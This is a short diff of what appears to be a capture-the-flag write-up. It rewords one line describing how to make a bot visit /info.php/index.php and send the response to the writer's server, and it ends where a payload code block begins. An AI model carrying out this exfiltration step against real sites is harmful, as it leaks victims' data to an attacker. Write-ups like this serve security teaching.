@@ -47,7 +47,7 @@
 
   ![image](https://github.com/user-attachments/assets/a822c94b-027c-498d-92de-f019cbc9e6e4)
 
-  **so now we can make the bot visit the /info.php/index.php and get the response and send it to our server**
+  **Now we can make the bot visit the /info.php/index.php and get the response and send it to our server**
 
   ```
   payload ->
